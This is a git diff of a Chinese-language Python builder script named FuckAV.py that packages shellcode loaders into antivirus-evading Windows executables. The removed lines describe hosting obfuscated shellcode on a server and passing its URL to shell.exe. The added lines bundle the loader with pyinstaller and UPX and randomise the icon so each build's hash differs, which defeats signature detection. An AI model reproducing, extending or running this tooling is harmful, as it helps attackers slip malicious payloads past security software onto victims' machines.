@@ -1,6 +1,11 @@
 import os
 import time
 from colorama import init,Fore,Back,Style
+from PIL import Image
+from PIL import ImageDraw
+from PIL import ImageFont
+import random
+
 init(autoreset=True)
 # 脚本采用python3.7编写
 # 采用pyinstaller打包，使用之前请安装pyinstaller
@@ -18,40 +23,47 @@ print(f"""
 ║    █████╗      ██║   ██║    ██║         █████╔╝     ███████║██║   ██║      ║
 ║    ██╔══╝      ██║   ██║    ██║         ██╔═██╗     ██╔══██║╚██╗ ██╔╝      ║
 ║    ██║         ╚██████╔╝    ╚██████╗    ██║  ██╗    ██║  ██║ ╚████╔╝       ║
-║    ╚═╝          ╚═════╝      ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝  ╚═══╝ V1.1   ║
-║  Author:1frame                                             Time:2021-8-20  ║
+║    ╚═╝          ╚═════╝      ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝  ╚═══╝ V1.2   ║
+║  Author:1frame                                             Time:2021-9-13  ║
 ╚============================================================================╝
 """)
 print('\033[1;31;40m''[*]''\033[1;37;40m'" exp: python FuckAV.py")
 print()
-print('\033[1;32;40m''[*]''\033[1;37;40m'" 先混淆shellcode生成txt，再编译exe！！！")
+print('\033[1;34;40m''[*]''\033[1;37;40m'" exe用法: 直接运行shell.exe即可 ")
 print()
-print('\033[1;33;40m''[*]''\033[1;37;40m'" 输入shellcode后将生成的txt文件放置在自己的服务器上，同时生成exe程序（shell.exe）")
-print()
-print('\033[1;34;40m''[*]''\033[1;37;40m'" exe用法: shell.exe \"shellcode加载地址\"")
-print()
-print('\033[1;35;40m''[*]''\033[1;37;40m'" exmpale: shell.exe http://www.baidu.com/shell.txt")
-print()
-print('\033[1;36;40m''[*]''\033[1;37;40m'" 更改exe图标: 替换目录下的ico.ico文件即可")
+print('\033[1;33;40m''[*]''\033[1;37;40m'" 安装依赖库: pip install -r requirement.txt ")
 print()
 print("====================================================================")
 print()
-print('\033[1;31;40m''[1]''\033[1;37;40m'": 编码shellcode")
-print('\033[1;31;40m''[2]''\033[1;37;40m'": 编译生成exe")
+print('\033[1;31;40m''[1]''\033[1;37;40m'": 编译生成exe")
+print('\033[1;31;40m''[2]''\033[1;37;40m'": 生成powershell脚本（暂未开发）")
 xz=input(f"""
 [♥] 选择1/2: """)
+
+def getRandomStr():
+    chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
+    charLen = len(chars)
+    pwd = ''
+    resultLen = random.randint(10, 20)
+    while len(pwd) < resultLen:
+        pwd += chars[random.randint(0,charLen-1)]
+    return pwd
+
+def ico_change():
+    font = ImageFont.truetype("C:\Windows\Fonts\Arial.ttf", 24)
+    imageFile = "ico.ico"
+    im1 = Image.open(imageFile)
+    draw = ImageDraw.Draw(im1)
+    draw.text((random.randint(1,128), random.randint(1,128)), "1frame  "+getRandomStr(), (random.randint(50,220), random.randint(50,220), random.randint(50,220)), font=font)    #设置文字位置/内容/颜色/字体
+    draw = ImageDraw.Draw(im1)
+    im1.save("ico.ico")
+
+
 if xz=="1":
-    import loader
-    print()
-    time.sleep(2)
-    print('\033[1;32;40m''[♥]''\033[1;37;40m''===================shellcode混淆完成======================')
-    print('\033[1;34;40m''[*]''\033[1;37;40m'" txt路径:\dist\hex.txt")
-    print('\033[1;34;40m''[*]''\033[1;37;40m'" 请将txt上传至您的服务器")
-    os.system("pause")
-    os.system("python fuckav.py")
-else:
-    if xz=="2":
-        os.system ("pyinstaller -F -w -i ico.ico decode.py -n shell.exe")
+        import loader
+        ico_change()
+        import decode
+        os.system ("pyinstaller -F -w -i ico.ico shell.py -n shell.exe --upx-dir=upx\\")
         print()
         time.sleep(2)
         print('\033[1;32;40m''[♥]''\033[1;37;40m'"===================exe打包完成====================")
